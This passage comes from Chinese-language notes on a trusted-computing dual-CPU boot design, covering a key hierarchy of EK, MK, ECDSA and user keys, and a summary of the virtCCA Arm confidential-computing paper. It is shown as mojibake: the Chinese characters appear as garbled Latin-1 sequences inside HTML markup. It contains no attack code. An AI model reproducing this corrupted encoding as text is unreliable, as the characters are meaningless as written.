å¯†åŠŸèƒ½ï¼ˆå¦‚<code>AES</code>ï¼‰ä¿æŠ¤é€šä¿¡è¿‡ç¨‹ä¸­çš„æ•°æ®ï¼Œé¿å…äº†å¤–éƒ¨æ€»çº¿ä¼ è¾“ä¸­å¸¸è§çš„çªƒå¬å’Œç¯¡æ”¹é£é™©ã€‚</li></ul><p>è¿™ä¸€è®¾è®¡ä»æ ¹æœ¬ä¸Šè§£å†³äº†ä¼ ç»Ÿ<code>TPM</code>æ¶æ„åœ¨ç‰©ç†å±‚é¢æš´éœ²çš„å®‰å…¨éšæ‚£ï¼Œä¸ºç³»ç»Ÿæä¾›äº†æ›´åšå›ºçš„ç¡¬ä»¶é˜²æŠ¤ã€‚</p><h4 id="ç³»ç»Ÿæ€§èƒ½ä¼˜åŒ–">ç³»ç»Ÿæ€§èƒ½ä¼˜åŒ–</h4><p>å¯ä¿¡è®¡ç®—åŒä½“ç³»æ¶æ„é€šè¿‡é«˜æ•ˆçš„ç‰‡å†…é€šä¿¡å’Œç¡¬ä»¶åŠ é€ŸæŠ€æœ¯ï¼Œæ˜¾è‘—æé«˜äº†ç³»ç»Ÿè¿è¡Œæ•ˆç‡ï¼š</p><ul><li><strong>ç‰‡å†…é«˜é€Ÿæ€»çº¿</strong>ï¼šæ¶æ„é‡‡ç”¨é«˜æ€§èƒ½çš„<code>AXI</code>æ€»çº¿ï¼Œæ”¯æŒå¤šä¸»å¤šä»æ¨¡å¼ï¼Œå®ç°äº†å¯ä¿¡CPUå’Œä¼ ç»ŸCPUä¹‹é—´çš„é«˜é€Ÿæ•°æ®ä¼ è¾“ã€‚ç›¸æ¯”ä¼ ç»Ÿçš„<code>SPI</code>æ€»çº¿ï¼Œ<code>AXI</code>æ€»çº¿æä¾›äº†æ›´é«˜çš„å¸¦å®½ï¼ˆæ”¯æŒ8è‡³1024ä½æ•°æ®é€šé“ï¼‰å’Œæ›´ä½çš„å»¶è¿Ÿï¼Œæ˜¾è‘—ç¼©çŸ­äº†ç³»ç»Ÿçš„å¯åŠ¨æ—¶é—´ã€‚</li><li><strong>ç¡¬ä»¶åŠ é€Ÿæ¨¡å—</strong>ï¼šå¯ä¿¡CPUé›†æˆäº†ç¡¬ä»¶åŠ é€Ÿçš„åŠ å¯†å¼•æ“ï¼ˆå¦‚<code>AES</code>ã€<code>SHA</code>å’Œ<code>ECDSA</code>ï¼‰ï¼Œåœ¨æ‰§è¡Œæ•°æ®åŠ å¯†å’Œå®Œæ•´æ€§éªŒè¯ä»»åŠ¡æ—¶æ¯”è½¯ä»¶å®ç°å¿«æ•°å€ã€‚ä¾‹å¦‚ï¼Œå®éªŒä¸­ç¡¬ä»¶åŠ é€Ÿçš„<code>AES</code>åŠ å¯†åœ¨å¤§æ•°æ®å—ä¸Šè¾¾åˆ°äº†633.8 MB/sçš„é€Ÿç‡ï¼Œè€Œè½¯ä»¶å®ç°ä»…ä¸º52.2 MB/sã€‚</li><li><strong>å¯åŠ¨æµç¨‹ä¼˜åŒ–</strong>ï¼šç¡¬ä»¶å¯ä¿¡æ ¹çš„ä¼˜å…ˆå¯åŠ¨å’Œç‰‡å†…é«˜æ•ˆé€šä¿¡ä½¿å¯åŠ¨æµç¨‹æ›´åŠ ç´§å‡‘ï¼Œé¿å…äº†ä¼ ç»Ÿ<code>TPM</code>æ¶æ„ä¸­å› å¯åŠ¨æ¬¡åºé—®é¢˜å¯¼è‡´çš„æ—¶é—´å»¶è¿Ÿã€‚å¯¹äºå¯åŠ¨æ—¶é—´æ•æ„Ÿçš„ç”¨æˆ·ï¼ˆå¦‚ä¸ªäººç”µè„‘å’Œç§»åŠ¨è®¾å¤‡ï¼‰ï¼Œè¿™ç§ä¼˜åŒ–å°¤ä¸ºé‡è¦ã€‚</li></ul><p>æ¶æ„çš„æ€§èƒ½æå‡ä¸ä»…ä½“ç°åœ¨å¯åŠ¨é˜¶æ®µï¼Œè¿˜ä¸ºå¯ä¿¡è®¡ç®—çš„åŠ¨æ€è¿è¡Œæä¾›äº†æ›´å¼ºå¤§çš„è®¡ç®—èƒ½åŠ›å’Œæ›´å¿«çš„å“åº”é€Ÿåº¦ã€‚</p><h2 id="Scheme-of-trusted-boot-system">Scheme of trusted boot system</h2><p>å¯ä¿¡è®¡ç®—å¯ä»¥å¯¹ç¡¬ä»¶ã€å›ºä»¶ã€GRand Unified Bootloaderï¼ˆ<code>GRUB</code>ï¼‰ã€æ“ä½œç³»ç»Ÿå’Œåº”ç”¨è½¯ä»¶è¿›è¡Œåº¦é‡å’ŒéªŒè¯ï¼Œä»è€Œå»ºç«‹æ•´ä¸ªå¹³å°çš„ä¿¡ä»»é“¾ã€‚ä¿¡ä»»é“¾çš„æ¥æºå†³å®šäº†æ•´æ¡ä¿¡ä»»é“¾çš„å¯é æ€§ã€‚ä¸‹é¢é‡ç‚¹ä»‹ç»ä»ç¡¬ä»¶ä¿¡ä»»æ ¹å¯åŠ¨åˆ°å›ºä»¶åŠ è½½å®Œæˆçš„å¯ä¿¡å¯åŠ¨æµç¨‹è®¾è®¡ï¼Œæœ¬æ–‡ä¸æ¶‰åŠä»å›ºä»¶åˆ°GRUBã€åˆ°OSã€åˆ°åº”ç”¨è½¯ä»¶çš„é˜¶æ®µã€‚</p><h3 id="Design-of-a-Secret-Key-System">Design of a Secret Key System</h3><ol><li><p><strong>æ ¹ç§˜é’¥ï¼ˆEndorsement Key, EKï¼‰</strong></p><p>æ ¹ç§˜é’¥ï¼ˆ<code>EK</code>ï¼‰æ˜¯ç³»ç»Ÿçš„ç¡¬ä»¶ä¿¡ä»»åŸºç¡€ï¼Œç”±åˆ¶é€ å•†åœ¨è®¾å¤‡ç”Ÿäº§é˜¶æ®µç”Ÿæˆã€‚<code>EK </code>æ˜¯ä¸€å¯¹éå¯¹ç§°å¯†é’¥ï¼ˆå…¬é’¥å’Œç§é’¥ï¼‰ï¼Œå…¶ç§é’¥è¢«ç›´æ¥å›ºåŒ–åœ¨å¯ä¿¡ CPU å†…éƒ¨çš„ ROM ä¸­ï¼Œè¿™ä¸€è¿‡ç¨‹åœ¨ CPU æ™¶åœ†ç”Ÿäº§é˜¶æ®µå®Œæˆï¼Œç¡®ä¿äº† <code>EK </code>çš„ä¸å¯è¯»å–æ€§å’Œä¸å¯ç¯¡æ”¹æ€§ã€‚<code>EK</code>çš„å­˜åœ¨ä½¿æ¯å°è®¾å¤‡æ‹¥æœ‰ç‹¬ä¸€æ— äºŒçš„èº«ä»½ï¼Œä»ç¡¬ä»¶å±‚é¢ä¸ºç³»ç»Ÿå»ºç«‹äº†åˆå§‹çš„ä¿¡ä»»ã€‚</p><p>åœ¨ç³»ç»Ÿè¿è¡Œæ—¶ï¼Œ<code>EK</code>ç§é’¥çš„ä¸»è¦åŠŸèƒ½æ˜¯åŠ å¯†å…¶ä»–ç§˜é’¥ï¼ˆå¦‚åˆ¶é€ å•†ç§˜é’¥<code>MK</code>ï¼‰ï¼Œä»è€Œä¸ºç§˜é’¥ç³»ç»Ÿæä¾›å¼ºå¤§çš„åŠ å¯†ä¿æŠ¤ã€‚<code>EK</code>çš„å…¬é’¥åˆ™å¯ä»¥è¢«å¤–éƒ¨ä½¿ç”¨ï¼Œç”¨äºè®¾å¤‡è®¤è¯æˆ–ä¿¡ä»»å»ºç«‹ï¼Œä¾‹å¦‚å‘å¤–éƒ¨éªŒè¯è®¾å¤‡æ˜¯å¦ä¸ºå¯ä¿¡ç¡¬ä»¶ã€‚</p><p><code>EK</code>çš„ç§é’¥å’Œå…¬é’¥è¢«è®¾è®¡ä¸ºæ— æ³•ç›´æ¥æš´éœ²ï¼Œç¡®ä¿æ ¹ç§˜é’¥çš„å®‰å…¨æ€§å’Œç‹¬ç«‹æ€§ã€‚é€šè¿‡è¿™ç§ç¡¬ä»¶å±‚é¢çš„éš”ç¦»ï¼Œ<code>EK</code>åœ¨æ•´ä¸ªç§˜é’¥ç³»ç»Ÿä¸­æ‰®æ¼”äº†ä¸å¯æ›¿ä»£çš„åŸºç¡€è§’è‰²ï¼Œç›´æ¥å†³å®šäº†ç³»ç»Ÿæœ€åº•å±‚çš„å®‰å…¨æ€§ã€‚</p></li><li><p><strong>åˆ¶é€ å•†ç§˜é’¥ï¼ˆManufacturer Key, MKï¼‰ä¸å…¬ç§é’¥å¯¹ï¼ˆECDSAï¼‰</strong></p><p>åˆ¶é€ å•†ç§˜é’¥ï¼ˆ<code>MK</code>ï¼‰æ˜¯ç³»ç»Ÿä¸­ç”¨äºä¿æŠ¤è®¾å¤‡åŠ è½½ç¨‹åºçš„å¯¹ç§°åŠ å¯†å¯†é’¥ï¼Œç”±åˆ¶é€ å•†ç”Ÿæˆå¹¶é€šè¿‡<code>EK</code>åŠ å¯†åå­˜å‚¨ã€‚<code>MK</code>ä¸ç›´æ¥å­˜å‚¨åŸå§‹å¯†é’¥ï¼Œè€Œæ˜¯ä»¥åŠ å¯†ç‰ˆæœ¬ï¼ˆ<code>ENC_MK</code>ï¼‰çš„å½¢å¼å­˜æ”¾äºè®¾å¤‡çš„<code>SPI Flash</code>ä¸­ã€‚åœ¨è®¾å¤‡å¯åŠ¨æ—¶ï¼Œå¯ä¿¡ CPU ä½¿ç”¨<code>ROM</code>ä¸­çš„<code>EK</code>ç§é’¥ï¼Œé€šè¿‡ç¡¬ä»¶åŠ å¯†å¼•æ“è§£å¯†<code>ENC_MK</code>ï¼Œä»è€Œæ¢å¤å‡º <code>MK</code>ã€‚æ¢å¤åçš„<code>MK</code>è¢«ç”¨äºè§£å¯†åŠ è½½ç¨‹åºæˆ–å…¶ä»–æ•æ„Ÿæ•°æ®ï¼Œå¹¶ç¡®ä¿è¿™äº›æ•°æ®åœ¨å¯åŠ¨å‰æœªè¢«ç¯¡æ”¹ã€‚</p><p>ä¸<code>MK</code>ä¸€èµ·å·¥ä½œçš„è¿˜æœ‰åˆ¶é€ å•†çš„<code>ECDSA</code>å…¬ç§é’¥å¯¹ï¼ˆ<code>PubK_ECDSA</code>å’Œ<code>PriK_ECDSA</code>ï¼‰ã€‚ç§é’¥ï¼ˆ<code>PriK_ECDSA</code>ï¼‰ç”±åˆ¶é€ å•†ä¿å­˜åœ¨å®‰å…¨æœåŠ¡å™¨ä¸­ï¼Œä»…ç”¨äºå¯¹åŠ è½½ç¨‹åºæˆ–å…³é”®æ•°æ®è¿›è¡Œæ•°å­—ç­¾åï¼Œè€Œå…¬é’¥ï¼ˆ<code>PubK_ECDSA</code>ï¼‰åˆ™è¢«å­˜å‚¨åœ¨è®¾å¤‡çš„<code>SPI Flash</code>ä¸­ï¼Œä¾›å¯ä¿¡CPUéªŒè¯åŠ è½½ç¨‹åºçš„æ•°å­—ç­¾åã€‚</p><p>ä¸ºäº†é˜²æ­¢å…¬é’¥è¢«ç¯¡æ”¹ï¼Œåˆ¶é€ å•†åœ¨ç”Ÿäº§é˜¶æ®µä¼šè®¡ç®—å…¬é’¥çš„å“ˆå¸Œå€¼ï¼ˆ<code>HASH_PubK_ECDSA</code>ï¼‰å¹¶å°†å…¶å›ºåŒ–åˆ°ç¡¬ä»¶ä¿¡ä»»æ ¹çš„ROMä¸­ã€‚è¿™ä¸€å›ºåŒ–è¿‡ç¨‹ä¸<code>EK</code>çš„å†™å…¥ç±»ä¼¼ï¼Œåœ¨æ™¶åœ†ç”Ÿäº§é˜¶æ®µå®Œæˆï¼Œç¡®ä¿å“ˆå¸Œå€¼çš„ä¸å¯æ›´æ”¹æ€§ã€‚åœ¨è®¾å¤‡å¯åŠ¨æ—¶ï¼Œå¯ä¿¡CPUä»<code>SPI Flash</code>è¯»å–å…¬é’¥ï¼ˆ<code>PubK_ECDSA</code>ï¼‰ï¼Œé€šè¿‡ç¡¬ä»¶åŠ å¯†å¼•æ“é‡æ–°è®¡ç®—å“ˆå¸Œå€¼ï¼Œä¸<code>ROM</code>ä¸­çš„<code>HASH_PubK_ECDSA</code>æ¯”å¯¹ã€‚å¦‚æœåŒ¹é…ï¼Œåˆ™è¯´æ˜å…¬é’¥æœªè¢«ç¯¡æ”¹ï¼Œå¯ä¿¡CPUéšåä¼šä½¿ç”¨å…¬é’¥éªŒè¯åŠ è½½ç¨‹åºçš„æ•°å­—ç­¾åï¼Œç¡®ä¿åŠ è½½ç¨‹åºçš„æ¥æºå’Œå®Œæ•´æ€§å¯ä¿¡ã€‚</p></li><li><p><strong>ç”¨æˆ·ç§˜é’¥ï¼ˆUser Key, UKï¼‰</strong></p><p>ç”¨æˆ·ç§˜é’¥æ˜¯ç”¨æˆ·åœ¨ç³»ç»Ÿä¸­çš„èº«ä»½å‡­æ®ï¼Œç”±ç”¨æˆ·ç”Ÿæˆä¸€å¯¹éå¯¹ç§°çš„å…¬ç§é’¥ï¼ˆ<code>UK_Pubå’ŒUK_Pri</code>ï¼‰ã€‚ç”¨æˆ·å…¬é’¥ï¼ˆ<code>UK_Pub</code>ï¼‰ç”±ç”¨æˆ·æä¾›ç»™åˆ¶é€ å•†ï¼Œåˆ¶é€ å•†å°†å…¶ä½¿ç”¨<code>MK</code>åŠ å¯†åå­˜å‚¨äºè®¾å¤‡çš„<code>SPI Flash</code>ä¸­ï¼Œç”ŸæˆåŠ å¯†ç‰ˆæœ¬<code>ENC_UK_Pub</code>ï¼›ç”¨æˆ·ç§é’¥ï¼ˆ<code>UK_Pri</code>ï¼‰ç”±ç”¨æˆ·è‡ªè¡Œä¿ç®¡ï¼Œç”¨äºç­¾å BIOS é…ç½®æ–‡ä»¶æˆ–å…¶ä»–ç”¨æˆ·è‡ªå®šä¹‰ä»£ç ã€‚</p><p>åœ¨BIOSç­¾åéªŒè¯è¿‡ç¨‹ä¸­ï¼Œå¯ä¿¡CPUé¦–å…ˆä½¿ç”¨<code>MK</code>è§£å¯†<code>ENC_UK_Pub</code>ï¼Œæ¢å¤ç”¨æˆ·æä¾›çš„å…¬é’¥<code>UK_Pub</code>ï¼Œç„¶åä½¿ç”¨è¯¥å…¬é’¥éªŒè¯BIOSçš„æ•°å­—ç­¾åï¼Œç¡®ä¿ç”¨æˆ·æä¾›çš„ä»£ç æœªè¢«ç¯¡æ”¹ã€‚ç”¨æˆ·ç§˜é’¥çš„å¼•å…¥ä½¿ç³»ç»Ÿåœ¨ä¿æŒåˆ¶é€ å•†å®‰å…¨ç®¡ç†çš„åŒæ—¶ï¼Œèµ‹äºˆç”¨æˆ·ä¸€å®šçš„å®‰å…¨æ§åˆ¶æƒï¼Œè¿›ä¸€æ­¥å¢å¼ºäº†ç³»ç»Ÿçš„çµæ´»æ€§å’Œå¯ä¿¡æ€§ã€‚</p></li><li><p><strong>ç¡¬ä»¶æ”¯æŒä¸å¯åŠ¨è¿‡ç¨‹</strong></p><p>ç¡¬ä»¶åœ¨æ•´ä¸ªç§˜é’¥ç³»ç»Ÿä¸­èµ·ç€æ ¸å¿ƒæ”¯æ’‘ä½œç”¨ï¼Œå…¶å®‰å…¨æ€§ç›´æ¥å†³å®šäº†ç³»ç»Ÿå¯ä¿¡è®¡ç®—èƒ½åŠ›çš„é«˜ä½ã€‚ç¡¬ä»¶ä¿¡ä»»æ ¹ä¸­çš„å…³é”®æ¨¡å—åŒ…æ‹¬ ROMã€ç¡¬ä»¶åŠ å¯†å¼•æ“å’Œéšæœºæ•°ç”Ÿæˆå™¨ï¼ˆ<code>TRNG</code>ï¼‰ã€‚ROM å­˜å‚¨äº†ç³»ç»Ÿæœ€æ ¸å¿ƒçš„æ•°æ®ï¼ŒåŒ…æ‹¬<code>EK</code>ç§é’¥å’Œ <code>HASH_PubK_ECDSA</code>ï¼Œå…¶ä¸å¯ä¿®æ”¹æ€§ä¸ºç³»ç»Ÿæä¾›äº†æœ€åŸºç¡€çš„ä¿¡ä»»ä¿éšœã€‚ç¡¬ä»¶åŠ å¯†å¼•æ“è´Ÿè´£æ‰§è¡Œ<code>AES</code>åŠ å¯†è§£å¯†ã€<code>ECDSA</code>ç­¾åéªŒè¯å’Œ<code>SHA</code>å“ˆå¸Œè®¡ç®—ç­‰æ“ä½œï¼Œè¿™äº›æ“ä½œç”±ç¡¬ä»¶å®Œæˆï¼Œæ¯”çº¯è½¯ä»¶å®ç°æ›´åŠ é«˜æ•ˆä¸”å®‰å…¨ã€‚<code>TRNG</code>ç”¨äºç”Ÿæˆé«˜è´¨é‡çš„éšæœºæ•°ï¼Œä¸ºç§˜é’¥ç”Ÿæˆæä¾›æ”¯æŒï¼Œç¡®ä¿åŠ å¯†çš„å¼ºåº¦ã€‚</p><p>å¯åŠ¨è¿‡ç¨‹ä¸­ï¼Œå¯ä¿¡ CPU é¦–å…ˆä»ROMä¸­è¯»å–<code>EK</code>å’Œ<code>HASH_PubK_ECDSA</code>ï¼ŒéªŒè¯<code>SPI Flash</code>ä¸­å­˜å‚¨çš„<code>PubK_ECDSA</code>å’ŒåŠ è½½ç¨‹åºçš„æ•°å­—ç­¾åã€‚åœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œç¡¬ä»¶åŠ å¯†å¼•æ“ä¼šè´Ÿè´£è®¡ç®—å…¬é’¥çš„å“ˆå¸Œå€¼ï¼Œå¹¶ä¸ROMä¸­çš„<code>HASH_PubK_ECDSA</code>è¿›è¡Œæ¯”å¯¹ã€‚å¦‚æœå…¬é’¥å¯ä¿¡ï¼Œå¯ä¿¡CPUä¼šç»§ç»­è§£å¯†<code>ENC_MK</code>ï¼Œæ¢å¤<code>MK</code>ï¼Œå¹¶è§£å¯†åŠ è½½ç¨‹åºã€‚éšåï¼Œä½¿ç”¨<code>PubK_ECDSA</code>éªŒè¯åŠ è½½ç¨‹åºçš„æ•°å­—ç­¾åï¼Œç¡®è®¤ç¨‹åºå®Œæ•´æ€§ï¼Œæœ€ç»ˆå¯åŠ¨ç³»ç»Ÿã€‚</p></li><li><p><strong>è®¾è®¡çš„å®‰å…¨æ€§ä¸ä¼˜åŠ¿</strong></p><p>è¿™å¥—ç§˜é’¥ç³»ç»Ÿç»“åˆç¡¬ä»¶å’ŒåŠ å¯†ç®—æ³•ï¼Œä»æ ¹ç§˜é’¥ï¼ˆ<code>EK</code>ï¼‰åˆ°ç”¨æˆ·ç§˜é’¥ï¼ˆ<code>UK</code>ï¼‰å±‚å±‚åŠ å¯†ä¿æŠ¤ï¼Œæ„å»ºäº†ä¸€ä¸ªä¸¥å¯†çš„ä¿¡ä»»é“¾ã€‚</p><ul><li><strong>ç¡¬ä»¶ä¸å¯ç¯¡æ”¹æ€§</strong>ï¼š<code>EK</code>å’Œ<code>HASH_PubK_ECDSA</code>å›ºåŒ–äºROMä¸­ï¼Œç¡®ä¿äº†ç³»ç»Ÿæœ€åº•å±‚çš„å®‰å…¨æ€§ï¼›<code>SPI Flash</code>ä¸­çš„ç§˜é’¥å’ŒåŠ è½½ç¨‹åºç»è¿‡åŠ å¯†ä¿æŠ¤ï¼Œå³ä½¿å¤–éƒ¨å­˜å‚¨å™¨è¢«æ”»å‡»ï¼Œæ”»å‡»è€…ä¹Ÿæ— æ³•ç›´æ¥æå–å…³é”®æ•°æ®ã€‚</li><li><strong>é€çº§éªŒè¯æœºåˆ¶</strong>ï¼šç³»ç»Ÿä»ç¡¬ä»¶åˆ°è½¯ä»¶é€å±‚éªŒè¯ï¼Œæ‰€æœ‰å…³é”®ç»„ä»¶ï¼ˆå¦‚å…¬é’¥ã€åŠ è½½ç¨‹åºã€BIOSé…ç½®æ–‡ä»¶ï¼‰éƒ½éœ€é€šè¿‡æ•°å­—ç­¾åå’Œå“ˆå¸Œæ¯”å¯¹ï¼Œç¡®ä¿æ¯ä¸€çº§è¿è¡Œç¯å¢ƒçš„å¯ä¿¡æ€§ã€‚</li><li><strong>é«˜æ•ˆæ€§èƒ½ä¸æŠ—æ”»å‡»èƒ½åŠ›</strong>ï¼šç¡¬ä»¶åŠ å¯†å¼•æ“æ”¯æŒé«˜æ€§èƒ½çš„åŠ å¯†ä¸éªŒè¯æ“ä½œï¼ŒåŒæ—¶æŠµå¾¡ç‰©ç†æ”»å‡»ï¼Œä¾‹å¦‚é˜²æ­¢å¤–éƒ¨æ¢æµ‹æˆ–æ‹†å¸ã€‚</li><li><strong>çµæ´»æ€§ä¸å¯ç®¡ç†æ€§</strong>ï¼šç”¨æˆ·ç§˜é’¥ä¸åˆ¶é€ å•†ç§˜é’¥çš„ç»“åˆï¼Œç¡®ä¿ç”¨æˆ·èƒ½å¤Ÿå‚ä¸ç³»ç»Ÿé…ç½®çš„å®‰å…¨ç®¡ç†ï¼ŒåŒæ—¶æ”¯æŒè®¾å¤‡çš„æ‰¹æ¬¡åŒ–ç®¡ç†ï¼Œé€‚ç”¨äºå¤§è§„æ¨¡ç”Ÿäº§ã€‚</li></ul><p>é€šè¿‡è¿™äº›è®¾è®¡ï¼Œç§˜é’¥ç³»ç»Ÿä¸ºå¯ä¿¡è®¡ç®—åŒæ¶æ„æä¾›äº†å¯é çš„å®‰å…¨ä¿éšœï¼Œä¸ä»…æé«˜äº†è®¾å¤‡çš„å®‰å…¨æ€§ï¼Œè¿˜å¢å¼ºäº†å…¶åœ¨å®é™…åº”ç”¨ä¸­çš„çµæ´»æ€§ã€‚</p></li></ol><h1 id="virtCCA-Virtualized-Arm-Confidential-Compute-Architecture-with-TrustZone">virtCCA: Virtualized Arm Confidential Compute Architecture with TrustZone</h1><p>è¿™ç¯‡æ–‡ç« æ˜¯åä¸ºçš„æœºå¯†è®¡ç®—è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹åä¸ºçš„æŠ€æœ¯ã€‚</p><h2 id="ABSTRACTï¼ˆæ‘˜è¦ï¼‰">ABSTRACTï¼ˆæ‘˜è¦ï¼‰</h2><p>æœ¬æ–‡æå‡ºäº†virtCCAï¼Œä¸€ç§åœ¨ç°æœ‰TrustZoneç¡¬ä»¶ä¸Šè™šæ‹ŸåŒ–ARMæœºå¯†è®¡ç®—æ¶æ„(CCA)çš„æ–¹æ¡ˆã€‚é‡ç‚¹åŒ…æ‹¬ï¼š</p><ul><li><p>virtCCAå¯åœ¨æ”¯æŒS-EL2(ARMv8.4+)å’Œä¸æ”¯æŒS-EL2çš„å¹³å°ä¸Šå®ç°</p></li><li><p>å®Œå…¨å…¼å®¹CCA APIè§„èŒƒï¼ŒåŒ…æ‹¬è¾“å…¥å‚æ•°ã€åŠŸèƒ½ã€è¿”å›å€¼å’Œé”™è¯¯å¤„ç†</p></li><li><p>å¼€å‘äº†å®Œæ•´çš„CCAè½¯ä»¶å’Œå›ºä»¶æ ˆï¼ŒåŒ…æ‹¬KVMå¢å¼ºå’ŒTrustZoneç®¡ç†ç›‘æ§å™¨(TMM)</p></li><li><p>è¯„ä¼°æ˜¾ç¤ºè¿è¡ŒcVMçš„å¼€é”€å¯æ¥å—ï¼ŒvirtCCA-SEL2åœ¨I/Oå¯†é›†å‹å·¥ä½œè´Ÿè½½ä¸‹å¼€é”€&lt;29.5%ï¼ŒvirtCCA-EL3åœ¨å¤šæ•°æƒ…å†µä¸‹ä¼˜äºåŸºçº¿</p></li></ul><h2 id="INTRODUCTIONï¼ˆå¼•è¨€ï¼‰">INTRODUCTIONï¼ˆå¼•è¨€ï¼‰</h2><p>æœ¬èŠ‚é¦–å…ˆä»‹ç»äº†æœºå¯†è®¡ç®—ï¼ˆConfidential Computingï¼‰çš„å‘å±•èƒŒæ™¯ï¼Œä»¥åŠå…¶åœ¨äº‘è®¡ç®—ä¸­æ—¥ç›Šé‡è¦çš„åœ°ä½ã€‚ä¼ ç»ŸTEEï¼ˆTrusted Execution Environmentï¼‰å¦‚Intel SGXã€AMD SEVå’ŒIBM PEFå·²ç»æ”¯æŒåœ¨äº‘ç¯å¢ƒä¸­ä¸ºç”¨æˆ·æä¾›éš”ç¦»çš„æ‰§è¡Œç¯å¢ƒã€‚è€ŒARMè™½ç„¶é€šè¿‡TrustZoneè¾ƒæ—©å®ç°äº†TEEï¼Œä½†å…¶åŸå§‹è®¾è®¡å¹¶ä¸é€‚åˆå®Œæ•´è¿è¡ŒLinuxç­‰æ“ä½œç³»ç»Ÿçš„cVMsï¼ˆconfidential VMsï¼‰ã€‚ä¸ºæ­¤ï¼ŒARMæ¨å‡ºäº†CCAï¼ˆConfidential Compute Architectureï¼‰ï¼Œå¼•å…¥Realmä½œä¸ºæ–°çš„éš”ç¦»ç¯å¢ƒã€‚</p><p>ç„¶è€Œï¼ŒCCAç¡¬ä»¶å°šæœªæ™®åŠï¼Œå¯¼è‡´ç›¸å…³è½¯ä»¶æ ˆéš¾ä»¥å¹¿æ³›éƒ¨ç½²ã€‚ä¸ºå¼¥åˆè¿™ä¸€å·®è·ï¼Œä½œè€…æå‡ºäº†<strong>virtCCA</strong>ï¼šåŸºäºç°æœ‰TrustZoneç¡¬ä»¶å¯¹CCAè¿›è¡Œè™šæ‹ŸåŒ–å®ç°ã€‚virtCCAä¸ä»…å…¼å®¹CCAçš„è½¯ä»¶æ¥å£ï¼Œè¿˜èƒ½åœ¨ä¸æ”¯æŒS-EL2ï¼ˆSecure EL2ï¼‰çš„è€æ—§ç¡¬ä»¶ä¸Šè¿è¡Œï¼Œå¹¶ä¸”å¯¹cVMå‡ ä¹ä¸éœ€è¦ä¿®æ”¹å³å¯æ”¯æŒç°æœ‰Linuxå‘è¡Œç‰ˆã€‚</p><p>virtCCAæ ¸å¿ƒæ€è·¯æ˜¯ä½¿ç”¨TrustZoneçš„å®‰å…¨ä¸–ç•Œä½œä¸ºcVMçš„è¿è¡Œç¯å¢ƒï¼ŒåŒæ—¶é€šè¿‡ä¸€ä¸ªå—ä¿¡ä»»ä½†ç®€åŒ–çš„è½¯ä»¶å±‚â€”â€”TrustZoneç®¡ç†ç›‘è§†å™¨ï¼ˆTrustZone Management Monitor,TMMï¼‰è´Ÿè´£ç®¡ç†cVMç”Ÿå‘½å‘¨æœŸã€CPUçŠ¶æ€åˆ‡æ¢å’Œå†…å­˜éš”ç¦»ã€‚</p><h2 id="BACKGROUNDï¼ˆèƒŒæ™¯ï¼‰">BACKGROUNDï¼ˆèƒŒæ™¯ï¼‰</h2><p>ä»‹ç»äº†èƒŒæ™¯çŸ¥è¯†ä»¥åŠå¨èƒæ¨¡å‹</p><ol><li><strong>TEE</strong>ï¼šä»‹ç»äº†å¯ä¿¡æ‰§è¡Œç¯å¢ƒçš„åŸºæœ¬æ¦‚å¿µå’ŒVM-based TEEs(å¦‚AMD SEVã€Intel TDX)</li><li><strong>ARMå¹³å°</strong>ï¼šè§£é‡Šäº†ARMå¼‚å¸¸çº§åˆ«(ELs)å’ŒTrustZoneçš„åŒä¸–ç•Œæ¶æ„</li><li><strong>ARM CCA</strong>ï¼šä»‹ç»äº†Realmä¸–ç•Œã€RMEæ‰©å±•å’ŒRMMçš„ä½œç”¨</li><li><strong>å¨èƒæ¨¡å‹</strong>ï¼šå‡è®¾æ”»å‡»è€…å¯èƒ½ç ´åhypervisorä½†æ— æ³•ç‰©ç†æ¥è§¦å¹³å°ï¼Œä¸è€ƒè™‘DoSå’Œä¾§ä¿¡é“æ”»å‡»</li></ol><h2 id="VIRTUALIZING-ARM-CONFIDENTIAL-COMPUTE-ARCHITECTUREï¼ˆè™šæ‹ŸåŒ–ARMæœºå¯†è®¡ç®—æ¶æ„ï¼‰">VIRTUALIZING ARM CONFIDENTIAL COMPUTE ARCHITECTUREï¼ˆè™šæ‹ŸåŒ–ARMæœºå¯†è®¡ç®—æ¶æ„ï¼‰</h2><p>è¯¦ç»†æè¿°äº†virtCCAçš„è®¾è®¡</p><h3 id="Overviewï¼ˆæ¦‚è¿°ï¼‰">Overviewï¼ˆæ¦‚è¿°ï¼‰</h3><p>æœ¬èŠ‚ä»‹ç»virtCCAçš„æ•´ä½“è®¾è®¡ç›®æ ‡å’Œæ¶æ„æ€è·¯ã€‚virtCCAçš„æ ¸å¿ƒç›®æ ‡æ˜¯åœ¨å°šæœªå…·å¤‡ARM CCAç¡¬ä»¶å¹³å°çš„æƒ…å†µä¸‹ï¼Œåœ¨ç°æœ‰ARMæ¶æ„ä¸Šï¼Œå°¤å…¶æ˜¯æ”¯æŒTrustZoneçš„å¹³å°ä¸Šï¼Œæ„å»ºä¸CCAè§„èŒƒå…¼å®¹çš„æœºå¯†è®¡ç®—ç¯å¢ƒã€‚ä¸ºäº†æ¨åŠ¨çœŸå®éƒ¨ç½²ï¼ŒvirtCCAè¢«è®¾è®¡æˆä¸€ç§å¯ç›´æ¥æ›¿æ¢CCAçš„å®ç°æ–¹æ¡ˆï¼ŒåŒæ—¶å…·å¤‡å¦‚ä¸‹èƒ½åŠ›ï¼šè‰¯å¥½çš„ç¡¬ä»¶å…¼å®¹æ€§ã€è½¯ä»¶ä¸å›ºä»¶å…¼å®¹æ€§ã€å®‰å…¨ä¿éšœä»¥åŠæ€§èƒ½ä¼˜åŒ–ã€‚</p><p>åœ¨ç¡¬ä»¶å…¼å®¹æ€§æ–¹é¢ï¼ŒvirtCCAå¯ä»¥è¿è¡Œåœ¨æ”¯æŒARMv8.4åŠä»¥ä¸Šçš„æ¶æ„ï¼ˆæ”¯æŒS-EL2ï¼‰ä»¥åŠæ›´æ—©æœŸä¸æ”¯æŒS-EL2çš„æ¶æ„ä¸Šã€‚åœ¨è½¯ä»¶æ–¹é¢ï¼ŒvirtCCAä¸CCAåœ¨APIå±‚ä¿æŒå…¼å®¹ï¼ŒHypervisorä¸­åªéœ€å°‘é‡ä¿®æ”¹å³å¯æ”¯æŒcVMç®¡ç†ï¼ŒcVMé•œåƒæœ¬èº«æ— éœ€ä»»ä½•ä¿®æ”¹å³å¯è¿è¡Œï¼Œå› 